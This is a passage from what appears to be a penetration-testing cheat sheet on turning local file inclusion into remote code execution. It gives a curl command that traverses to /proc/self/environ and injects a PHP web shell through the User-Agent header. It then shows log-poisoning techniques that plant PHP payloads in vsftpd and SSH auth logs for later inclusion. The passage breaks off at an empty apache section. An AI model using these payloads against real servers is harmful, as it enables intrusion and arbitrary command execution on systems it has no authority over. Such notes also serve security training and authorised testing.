...
```
curl http://ip/nav.php?page=../../../proc/self/environ -A "<?php system($_GET['c']); ?>"
then access /proc/self/environ
```
### Via log poision
vsftpd log
```
Inject a PHP payload into the username field during the login process.
utilize the LFI to retrieve the server logs from /var/log/vsftpd.log.
```
ssh log
```
ssh `<?php phpinfo(); ?>`@ip
visit /var/log/auth.log
```
apache log
```
